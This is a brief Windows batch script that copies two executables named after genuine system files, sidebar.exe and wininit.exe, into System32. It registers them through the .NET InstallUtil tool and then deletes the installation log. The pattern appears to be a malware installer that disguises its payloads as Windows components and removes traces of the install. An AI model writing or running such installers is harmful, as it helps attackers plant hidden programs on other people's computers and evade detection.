E:
cd E:\bolt\Bolt

copy sidebar.exe %WINDIR%\System32\
copy wininit.exe %WINDIR%\System32\

%WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe %WINDIR%\System32\sidebar.exe
%WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe %WINDIR%\System32\wininit.exe

#smodedel

del InstallUtil.INstallLog
